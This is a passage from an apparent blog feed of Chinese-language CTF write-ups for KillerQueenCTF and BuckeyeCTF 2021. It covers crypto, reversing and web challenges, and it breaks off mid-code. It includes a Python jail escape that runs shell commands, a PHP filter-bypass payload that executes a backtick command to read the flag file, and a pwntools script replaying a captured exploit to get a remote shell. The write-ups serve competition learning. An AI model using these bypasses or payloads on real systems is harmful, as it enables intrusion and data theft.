编写代码,用RSA解密 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher import base64 c = &#39;Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==&#39; with open(&#39;a.pem&#39;,&#39;r&#39;) as f: pri_key = RSA.importKey(f.read()) cipher = PKCS1_cipher.new(pri_key) plain = cipher.decrypt(base64.b64decode(c), 0) print(plain) flag:kqctf&#123;y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0&#125; Road_Safety_AssociationThat’s what it stands for, right? 题目给了c,p,q,e的值,直接求d解密即可代码: import gmpy2 from Crypto.Util.number import long_to_bytes c = 34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618 p = 7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969 q = 11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857 e = 65537 n = p * q phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) x = pow(c, d, n) print(x) print(long_to_bytes(x)) flag:kqctf&#123;y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc&#125; Hammer To FallDynamically sized integers huh (wrap the proper input in a flag wrapper kqctf{number}) 源文件: import numpy as np a = np.array([0], dtype=int) val = int(input(&quot;This hammer hits so hard it creates negative matter\\n&quot;)) if val == -1: exit() a[0] = val a[0] = (a[0] * 7) + 1 print(a[0]) if a[0] == -1: print(&quot;flag!&quot;) NumPy中的int使用的是C中的long,参照NumPy文档,最大值为9223372036854775807 &gt;&gt;&gt; 9223372036854775807 // 7 * 2 2635249153387078802 flag:kqctf&#123;2635249153387078802&#125; I want to break freeI want to break free… from this Python jail. nc 143.198.184.186 45457 使用&#39;o&#39;+&#39;s&#39;绕过对os的过滤,执行ls命令,发现存在文件cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt ~$ nc 143.198.184.186 45457 You are in jail. Can you escape? &gt; __builtins__.__import__(&#39;o&#39;+&#39;s&#39;).system(&#39;ls&#39;) bin blacklist.txt boot cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt dev etc home jail.py lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var None 读取文件内容 &gt; print(__builtins__.open(&#39;cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt&#39;).read()) kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125; None flag:kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125; sneeki snekssssssssssssssssssssssssssssssssssssss 根据字节码还原文件: f = &#39;&#39; a = &#39;rwhxi&#125;eomr\\\\^`Y&#39; z = &#39;f]XdThbQd^TYL&amp;\\x13g&#39; a = a + z for i,b in enumerate(a): c = ord(b) c = c - 7 c = c+i f += chr(c) print(f) flag:kqctf&#123;dont_be_mean_to_snek_:(&#125; sneeki snek 2 oh no what did i dodid snek steal your pasta because this is some spaghetti 根据字节码还原文件: a = list() a.append(1739411) a.append(1762811) a.append(1794011) a.append(1039911) a.append(1061211) a.append(1718321) a.append(1773911) a.append(1006611) a.append(1516111) a.append(1739411) a.append(1582801) a.append(1506121) a.append(1783901) a.append(1783901) a.append(1773911) a.append(1582801) a.append(1006611) a.append(1561711) a.append(1039911) a.append(1582801) a.append(1773911) a.append(1561711) a.append(1582801) a.append(1773911) a.append(1006611) a.append(1516111) a.append(1516111) a.append(1739411) a.append(1728311) a.append(1539421) b = &#39;&#39; for i in a: c = str(i) c=c[::-1] c= c[:-1] c = int(c) c = 5 ^ c c= c - 55555 c = c // 555 b = b + chr(c) print(b) flag:kqctf&#123;snek_waas_not_so_sneeki&#125; Just Not My TypeI really don’t think we’re compatible (Link) 源文件: &lt;h1&gt;I just don&#39;t think we&#39;re compatible&lt;/h1&gt; &lt;?php $FLAG = &quot;shhhh you don&#39;t get to see this locally&quot;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39;) &#123; $password = $_POST[&quot;password&quot;]; if (strcasecmp($password, $FLAG) == 0) &#123; echo $FLAG; &#125; else &#123; echo &quot;That&#39;s the wrong password!&quot;; &#125; &#125; ?&gt; &lt;form method=&quot;POST&quot;&gt; Password &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; Payload password[]=123 flag:flag&#123;no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible&#125; PHat Pottomed GirlsNow it’s attempt number 3 and this time with a Queen reference! (flag is in the root directory) 源文件: &lt;?php session_start(); function generateRandomString($length = 15) &#123; $characters = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;; $charactersLength = strlen($characters); $randomString = &#39;&#39;; for ($i = 0; $i &lt; $length; $i++) &#123; $randomString .= $characters[rand(0, $charactersLength - 1)]; &#125; return $randomString; &#125; function filter($originalstring) &#123; $notetoadd = str_replace(&quot;&lt;?php&quot;, &quot;&quot;, $originalstring); $notetoadd = str_replace(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;flag&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;system&quot;, &quot;&quot;, $notetoadd); return $notetoadd; &#125; if(isset($_POST[&quot;notewrite&quot;])) &#123; $newnote = $_POST[&quot;notewrite&quot;]; //3rd times the charm and I&#39;ve learned my lesson. Now I&#39;ll make sure to filter more than once :) $notetoadd = filter($newnote); $notetoadd = filter($notetoadd); $notetoadd = filter($notetoadd); $filename = generateRandomString(); array_push($_SESSION[&quot;notes&quot;], &quot;$filename.php&quot;); file_put_contents(&quot;$filename.php&quot;, $notetoadd); header(&quot;location:index.php&quot;); &#125; Payload &lt;&lt;&lt;&lt;&lt;&lt;&lt;?php??php??php??php echo `sort /fffflaglaglaglag.php`; ????&gt;&gt;&gt;&gt; flag:flag&#123;wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((&#125;","date_published":"2021-11-02T07:04:27.000Z","tags":["CTF","CTF","KillerQueenCTF"]},{"id":"https://zhaoqi.vip/posts/4120451577/","url":"https://zhaoqi.vip/posts/4120451577/","title":"BuckeyeCTF2021 Writeup","content_html":"<h1 id=\"Key-Exchange\"><a href=\"#Key-Exchange\" class=\"headerlink\" title=\"Key Exchange\"></a>Key Exchange</h1><p><em>Let’s exchange the flag (securely):</em><br><em>nc crypto.chall.pwnoh.io 13374</em></p>\n<hr>\n<p>分析给出的代码,发现当输入的B等于g的时候,A的值即为<code>shared_secret</code>,从而可以得到AES密钥,解密后即可得到flag.</p>\n<p>使用nc连接服务器:</p>\n<pre><code class=\"shell\">╭─ ~/CTF/BuckeyeCTF2021\n╰─$ nc crypto.chall.pwnoh.io 13374\nI&#39;m going to send you the flag.\nHowever, I noticed that an FBI agent has been eavesdropping on my messages,\nso I&#39;m going to send it to you in a way that ONLY YOU can decrypt the flag.\n\np = 10880518517873967643757501014080864657695946662967756945469976115601889926901188881654458659008874387964581741306546485865737476973040012870453076020399351\ng = 5\nA = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180\nGive me your public key B: 5\nciphertext = a54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8\n</code></pre>\n<p>代码</p>\n<pre><code class=\"python\">def decrypt():\n    shared_secret = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180\n    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:16]\n    cipher = AES.new(key, AES.MODE_ECB)\n    message = 0xa54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8\n    plaintext = cipher.decrypt(cun.long_to_bytes(message))\n    print(plaintext)\n\ndecrypt()\n</code></pre>\n<p><strong>flag:</strong><code>buckeye&#123;DH_1s_s0_h3ck1ng_c00l_l1k3_wh0_w0uldv3_th0ught_0f_th1s?&#125;</code></p>\n<h1 id=\"layers\"><a href=\"#layers\" class=\"headerlink\" title=\"layers\"></a>layers</h1><p><em>Check out my brand new docker repo <a href=\"https://hub.docker.com/r/qxxxb/layers\">https://hub.docker.com/r/qxxxb/layers</a></em></p>\n<hr>\n<p>查看镜像历史,发现曾经存在一个<code>flag.png</code>,但是被删除了</p>\n<pre><code class=\"shell\">[root@VM-8-4-centos ~] docker history qxxxb/layers\nIMAGE          CREATED       CREATED BY                                      SIZE      COMMENT\n0c01a25ae5b7   5 days ago    /bin/sh -c echo &quot;Sorry, the flag has been de…   36B\n&lt;missing&gt;      5 days ago    /bin/sh -c rm flag.png                          0B\n&lt;missing&gt;      5 days ago    /bin/sh -c #(nop) COPY multi:6b3bd56201fda03…   599kB\n&lt;missing&gt;      8 weeks ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot;]              0B\n&lt;missing&gt;      8 weeks ago   /bin/sh -c #(nop) ADD file:aad4290d27580cc1a…   5.6MB\n</code></pre>\n<p>使用<code>docker save</code>将镜像保存成tar包并解压,然后再解压每一层文件夹中中的<code>layer.tar</code>找到<code>flag.png</code></p>\n<pre><code class=\"shell\">[root@VM-8-4-centos ~] docker save qxxxb/layers -o a.tar\n[root@VM-8-4-centos ~]# tar xvf a.tar\n0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9.json\n7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/\n7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/VERSION\n7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/json\n7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar\n8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/\n8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/VERSION\n8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/json\n8771987229b6efdf7a40855b92529d9287e96ead2f6668d84f6a07809818db52/layer.tar\nc37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/\nc37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/VERSION\nc37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/json\nc37364b4cf72fc0eb131ee6d62795ef9cf3641340dd0aa8da6849b4c9cd5c41f/layer.tar\nc6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/\nc6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/VERSION\nc6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/json\nc6dd22d66071385f6a0d7242a2f2a895073c8ab84871b56390a3449038a49727/layer.tar\nmanifest.json\nrepositories\n[root@VM-8-4-centos ~]# tar xvf 7c029681dc775f74b57cccd272523fd31a20f89cc2db9b514981fcbfb467b5c8/layer.tar\nDockerfile\nflag.png\n</code></pre>\n<p><img data-src=\"/../../CTF/BuckeyeCTF2021/Misc/images/flag.png\" alt=\"flag\"></p>\n<p><strong>flag:</strong><code>buckeye&#123;D0CK3R_H4S_L4Y3RS&#125;</code></p>\n<h1 id=\"replay\"><a href=\"#replay\" class=\"headerlink\" title=\"replay\"></a>replay</h1><p><em>Somebody pwned my app! Luckily I managed to capture the network traffic of their exploit. Oh by the way, the same app is also running on <code>misc.chall.pwnoh.io</code> on port <code>13371</code>. Can you pwn it for me?</em></p>\n<hr>\n<p>使用<a href=\"https://www.wireshark.org/download.html\">Wireshark</a>分析<code>replay.pcap</code>文件,跟踪TCP流,发现似乎是发送了一些数据拿到Shell权限后,执行了一些命令.</p>\n<p>对着“Data”右键,选择“导出分组字节流”,保存字节流数据至<code>a.bin</code></p>\n<img data-src=\"../../CTF/BuckeyeCTF2021/Misc/images/replay-1.png\" alt=\"image-20211027235735902\" style=\"zoom:60%;\" />\n\n<p>编写脚本,使用<a href=\"https://github.com/Gallopsled/pwntools\">pwn</a>连接服务器并发送数据,执行shell命令,找到<code>flag.txt</code>文件</p>\n<pre><code class=\"shell\">╭─ ~/CTF/BuckeyeCTF2021\n╰─$ python a.py\n[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done\n[*] Switching to interactive mode\n$ ls\nchall\nflag.txt\n$ cat flag.txt\nbuckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125;\n</code></pre>\n<p>代码:</p>\n<pre><code class=\"python\">from pwn import *\np = remote(&#39;misc.chall.pwnoh.io&#39;, 13371)\np.recvuntil(b&#39;TODAY&#39;, drop=True)\np.recvline()\nwith open(&#39;a.bin&#39;,&#39;rb&#39;) as f:\n    data  = f.read()\np.send(data)\np.interactive()\np.close()\n</code></pre>\n<p><strong>flag:</strong><code>buckeye&#123;g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry&#125;</code></p>\n<h1 id=\"Buttons\"><a href=\"#Buttons\" class=\"headerlink\" title=\"Buttons\"></a>Buttons</h1><p><em>Anyone taken Software 1? Can you help me figure out what this weird Java program does?</em></p>\n<hr>\n<p>用<a href=\"http://www.javadecompilers.com/\">javadecompilers</a>反编译<code>Buttons.jar</code>得到源码.</p>\n<p>观察到有一个<code>printFlag</code>函数,但是依赖于<code>moveHistory</code>,所以不能通过直接运行<code>printFlag</code>来得到flag.</p>\n<p>分析调用<code>printFlag</code>函数的<code>actionPerformed</code>,发现:只有当前点击的方格是<code>isLegalMove</code>的时候,才会被加到<code>moveHistory</code>里;当前点击的方格是最后一个时就会打印出<code>flag</code>.</p>\n<p>继续分析<code>isLegalMove</code>函数,发现该函数返回为<code>True</code>时必须满足<code>grid[n][n2] == 0</code>.</p>\n<p>那么我们可以在初始化的时候,将所有满足<code>grid[n][n2] == 0</code>的方格设为🏁,然后依次点击显示为🏁的方格即可.</p>\n<pre><code class=\"java\">this.buttons[i][j] = new JButton(&quot;?&quot;);\n\nif(this.grid[i][j] == 0)&#123;\n  this.buttons[i][j].setText(&quot;\\u2691&quot;);\n&#125;\n</code></pre>\n<p>使用<code>javac</code>命令将源代码编译为Java字节码文件并运行.</p>\n<pre><code class=\"shell\">╭─ ~/CTF/BuckeyeCTF2021\n╰─$ javac Buttons.java\n注: Buttons.java使用了未经检查或不安全的操作。\n注: 有关详细信息, 请使用 -Xlint:unchecked 重新编译。\n╭─ ~/CTF/BuckeyeCTF2021\n╰─$ java Buttons\n</code></pre>\n<p><img data-src=\"/../../CTF/BuckeyeCTF2021/Reverse/images/Buttons.png\" alt=\"Buttons!\"></p>\n<p>代码</p>\n<pre><code class=\"java\">/*\n * Decompiled with CFR 0.150.\n */\nimport java.awt.Dimension;\nimport java.awt.GridLayout;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.math.BigInteger;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport javax.swing.BoxLayout;\nimport javax.swing.JButton;\nimport javax.swing.JFrame;\nimport javax.swing.JLabel;\nimport javax.swing.JOptionPane;\nimport javax.swing.JPanel;\n\npublic final class Buttons\nextends JFrame\nimplements ActionListener &#123;\n    private static final int[][] grid = new int[][]&#123;\n        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1&#125;,\n        &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;,\n        &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1&#125;,\n        &#123;1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;,\n        &#123;1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;,\n        &#123;1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;,\n        &#123;1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1&#125;,\n        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;,\n        &#123;1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;, \n        &#123;1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1&#125;,\n        &#123;1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1&#125;,\n        &#123;1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1&#125;,\n        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;,\n        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1&#125;,\n        &#123;1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1&#125;,\n        &#123;1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1&#125;,\n        &#123;1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1&#125;,\n        &#123;1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1&#125;,\n        &#123;1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1&#125;,\n        &#123;1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1&#125;,\n        &#123;1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1&#125;\n    &#125;;\n    private final int rows;\n    private final int cols;\n    private final JLabel movesLabel;\n    private final JButton resetButton;\n    private final JButton[][] buttons;\n    private int posRow;\n    private int posCol;\n    private final int endRow;\n    private final int endCol;\n    private static final int MAX_MOVES = 139;\n    private ArrayList&lt;Integer&gt; moveHistory;\n\n    public static void main(String[] arrstring) throws Exception &#123;\n        new Buttons();\n    &#125;\n\n    public Buttons() &#123;\n        super(&quot;Buttons!&quot;);\n        this.resetValues();\n        this.rows = grid.length;\n        this.cols = grid[0].length;\n        this.endRow = this.rows - 1;\n        this.endCol = this.cols - 2;\n        JPanel jPanel = new JPanel();\n        jPanel.setLayout(new BoxLayout(jPanel, 3));\n        JPanel jPanel2 = new JPanel(new GridLayout(this.rows, this.cols));\n        JPanel jPanel3 = new JPanel();\n        this.buttons = new JButton[this.rows][this.cols];\n        for (int i = 0; i &lt; this.rows; ++i) &#123;\n            for (int j = 0; j &lt; this.cols; ++j) &#123;\n                this.buttons[i][j] = new JButton(&quot;?&quot;);\n\n                  if(this.grid[i][j] == 0) &#123;\n                                  this.buttons[i][j].setText(&quot;\\u2691&quot;);\n                                &#125;\n\n                this.buttons[i][j].addActionListener(this);\n                this.buttons[i][j].setActionCommand(Integer.toString(j + i * this.cols));\n                jPanel2.add(this.buttons[i][j]);\n            &#125;\n        &#125;\n        this.buttons[this.endRow][this.endCol].setText(&quot;\\u2691&quot;);\n        jPanel2.setPreferredSize(new Dimension(45 * this.rows, 45 * this.cols));\n        this.movesLabel = new JLabel(&quot;Moves left: 20&quot;);\n        jPanel3.add(this.movesLabel);\n        this.resetButton = new JButton(&quot;Reset&quot;);\n        this.resetButton.addActionListener(this);\n        this.resetButton.setActionCommand(&quot;reset&quot;);\n        jPanel3.add(this.resetButton);\n        jPanel.add(jPanel2);\n        jPanel.add(jPanel3);\n        this.resetGUI();\n        this.getContentPane().add(jPanel);\n        this.pack();\n        this.setDefaultCloseOperation(3);\n        this.setVisible(true);\n    &#125;\n\n    private void resetValues() &#123;\n        this.posRow = 0;\n        this.posCol = 1;\n        this.moveHistory = new ArrayList();\n        this.moveHistory.add(this.posCol + this.posRow * this.cols);\n    &#125;\n\n    private void updateMovesLeft() &#123;\n        this.movesLabel.setText(&quot;Moves left: &quot; + Integer.toString(139 - this.moveHistory.size()));\n    &#125;\n\n    private void resetGUI() &#123;\n        for (int i = 0; i &lt; this.rows; ++i) &#123;\n            for (int j = 0; j &lt; this.cols; ++j) &#123;\n                this.buttons[i][j].setEnabled(true);\n            &#125;\n        &#125;\n        for (int j : this.moveHistory) &#123;\n            int n = j / this.cols;\n            int n2 = j % this.cols;\n            this.buttons[n][n2].setEnabled(false);\n        &#125;\n        this.updateMovesLeft();\n    &#125;\n\n    private void reset() &#123;\n        this.resetValues();\n        this.resetGUI();\n    &#125;\n\n    private boolean isLegalMove(int n, int n2) &#123;\n        if (139 - this.moveHistory.size() &lt;= 0) &#123;\n            return false;\n        &#125;\n        return grid[n][n2] == 0 &amp;&amp; Math.abs(n - this.posRow) + Math.abs(n2 - this.posCol) == 1;\n    &#125;\n\n    private void printFlag() &#123;\n        BigInteger bigInteger;\n        BigInteger[] arrbigInteger = new BigInteger[this.moveHistory.size()];\n        arrbigInteger[0] = BigInteger.valueOf(2L);\n        for (int i = 1; i &lt; arrbigInteger.length; ++i) &#123;\n            arrbigInteger[i] = arrbigInteger[i - 1].nextProbablePrime();\n        &#125;\n        BigInteger bigInteger2 = BigInteger.valueOf(1L);\n        BigInteger bigInteger3 = new BigInteger(&quot;1430313837704837266267655033918654049072573502772041995300810633148485540425442305963378206448908414865491202671058946396326575688430628383447817933039379&quot;);\n        for (int i = 0; i &lt; this.moveHistory.size(); ++i) &#123;\n            bigInteger = BigInteger.valueOf(this.moveHistory.get(i).intValue());\n            bigInteger2 = bigInteger2.multiply(arrbigInteger[i].modPow(bigInteger, bigInteger3)).mod(bigInteger3);\n        &#125;\n        BigInteger bigInteger4 = new BigInteger(&quot;1181624346478884506978387685027501257422054115549381320819711748725513305918055802813085700551988448885328987653245675378090761255233757606571908411691314&quot;);\n        bigInteger = bigInteger4.multiply(bigInteger2).mod(bigInteger3);\n        byte[] arrby = bigInteger.toByteArray();\n        String string = new String(arrby, StandardCharsets.UTF_8);\n        JOptionPane.showMessageDialog(this, &quot;Congrats! The flag is: &quot; + string, &quot;Flag&quot;, 1);\n        System.out.println(string);\n    &#125;\n\n    @Override\n    public void actionPerformed(ActionEvent actionEvent) &#123;\n        String string = actionEvent.getActionCommand();\n        if (string.equals(&quot;reset&quot;)) &#123;\n            this.reset();\n        &#125; else &#123;\n            int n;\n            int n2 = Integer.parseInt(string);\n            int n3 = n2 / this.cols;\n            if (this.isLegalMove(n3, n = n2 % this.cols)) &#123;\n                this.buttons[n3][n].setEnabled(false);\n                this.posRow = n3;\n                this.posCol = n;\n                this.moveHistory.add(n2);\n                System.out.println(this.moveHistory);\n                this.updateMovesLeft();\n                if (this.posRow == this.endRow &amp;&amp; this.posCol == this.endCol) &#123;\n                    this.printFlag();\n                &#125;\n            &#125; else &#123;\n                JOptionPane.showMessageDialog(this, &quot;Illegal move, you lose \\u2639&quot;, &quot;Illegal move&quot;, 0);\n                this.reset();\n            &#125;\n        &#125;\n    &#125;\n&#125;\n</code></pre>\n<p><strong>flag:</strong><code>buckeye&#123;am4z1ng_j0b_y0u_b1g_j4va_h4ck3r&#125;</code></p>\n<h1 id=\"pay2win\"><a href=\"#pay2win\" class=\"headerlink\" title=\"pay2win\"></a>pay2win</h1><p><em>Kyle started an online magazine (The Daily Kyle) and published one of my articles on his site. Don’t worry, the article literally contains the flag in plaintext, but if you want to read it you’ll have to figure out how to bypass the paywall.</em></p>\n<p><em>URL: <a href=\"https://pay2win.chall.pwnoh.io/\">https://pay2win.chall.pwnoh.io</a></em></p>\n<hr>\n<p>查看网页源代码,发现<code>plantFlag</code>函数,粘贴到Console中运行后,打印出<code>shwl_l1_twcd14&#125;1ry4ht3neck_t3_bs&#123;1c_hkh_tsh3he03gy_3l_hu</code>.</p>\n<pre><code class=\"javascript\">const ciphertext = [\n    234, 240, 234, 252, 214, 236, 140, 247, 173, 191, 158, 132, 56, 4, 32, 73, 235, 193, 233, 152,\n    125, 19, 19, 237, 186, 131, 98, 52, 186, 143, 127, 43, 226, 233, 126, 15, 225, 171, 85, 55,\n    173, 123, 21, 147, 97, 21, 237, 11, 254, 129, 2, 131, 101, 63, 149, 61,\n];\nconst plaintext = ciphertext.map((x, i) =&gt; (i * i) % 256 ^ x ^ 0x99);\n\nconst flagElement = document.querySelector(&quot;#flag&quot;);\nplaintext.map((x, i) =&gt; &#123;\n    const span = document.createElement(&quot;span&quot;);\n    span.classList.add(`flag-char-$&#123;i&#125;`);\n    span.textContent = String.fromCharCode(x);\n    flagElement.appendChild(span);\n    return span;\n&#125;);\n</code></pre>\n<p>查看<code>main.css</code>,发现<code>span</code>都被设置了<code>order</code>属性.</p>\n<p>我们可以把<code>main.css</code>,<code>main.js</code>和网页源代码<code>a.html</code>下载到本地.然后注释掉<code>main.js</code>里弹窗和阻止滚动的代码.</p>\n<p>打开<code>a.html</code>,发现本应该显示<code>flag</code>的地方有一个灰色的框.</p>\n<p>编辑<code>a.html</code>,将 <code>&lt;code id=&quot;flag&quot;&gt;&lt;/code&gt;</code>这一行代码移动至<code>&lt;pre&gt;</code>标签外面,即可看到<code>flag</code>.</p>\n<p><img data-src=\"/../../CTF/BuckeyeCTF2021/Web/images/pay2win.jpg\" alt=\"pay2win\"></p>\n<p><strong>flag:</strong><code>buckeye&#123;h0ly_sh1t_wh4t_th3_h3ck_1s_th1s_w31rd_ch4ll3ng3&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"Key ExchangeLet’s exchange the flag (securely):nc crypto.chall.pwnoh.io 13374 分析给出的代码,发现当输入的B等于g的时候,A的值即为shared_secret,从而可以得到AES密钥,解密后即可得到flag. 使用nc连接服务器: ╭─ ~/CTF/BuckeyeCTF2021 ╰─$ nc crypto.chall.pwnoh.io 13374 I&#39;m going to send you the flag. However, I noticed that an FBI agent has been eavesdropping on my messages, so I&#39;m going to send it to you in a way that ONLY YOU can decrypt the flag. p = 10880518517873967643757501014080864657695946662967756945469976115601889926901188881654458659008874387964581741306546485865737476973040012870453076020399351 g = 5 A = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180 Give me your public key B: 5 ciphertext = a54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8 代码 def decrypt(): shared_secret = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180 key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:16] cipher = AES.new(key, AES.MODE_ECB) message = 